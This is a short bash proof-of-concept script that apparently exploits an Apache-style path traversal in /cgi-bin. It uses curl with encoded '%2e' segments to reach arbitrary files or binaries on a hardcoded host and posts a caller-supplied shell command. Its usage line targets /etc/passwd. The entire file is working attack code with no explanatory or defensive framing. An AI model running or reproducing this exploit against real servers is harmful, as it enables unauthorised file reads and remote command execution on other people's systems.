#!/bin/bash

echo "Set [PATH] [COMMAND]"
echo "./PoC.sh /etc/passwd"

host="http://10.49.168.214"

echo "$host"
echo "$1"
echo "$2"
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $2" "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$1"
